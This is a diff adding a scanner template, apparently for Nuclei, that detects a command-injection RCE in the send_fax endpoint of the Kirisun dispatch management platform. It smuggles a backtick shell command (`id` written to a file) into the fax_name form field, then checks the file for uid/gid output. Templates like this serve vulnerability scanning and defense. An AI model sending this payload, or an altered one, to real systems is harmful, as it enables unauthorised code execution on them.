@@ -1,0 +1,35 @@
+id: poc-yaml-kirisun-send-fax-rce
+info:
+  name: 福建科立讯通信 指挥调度管理平台 send_fax 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /api/client/fax/send_fax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fax_name=`id > {{random_file}}.txt`.pdf
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "pdfupload file error Fax image not available on server"
+  - raw:
+      - |
+        GET /api/client/fax/{{random_file}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+      - type: word
+        words:
+          - "<"
+        negative: true
+variables:
+  random_file: "{{rand_base(4)}}"
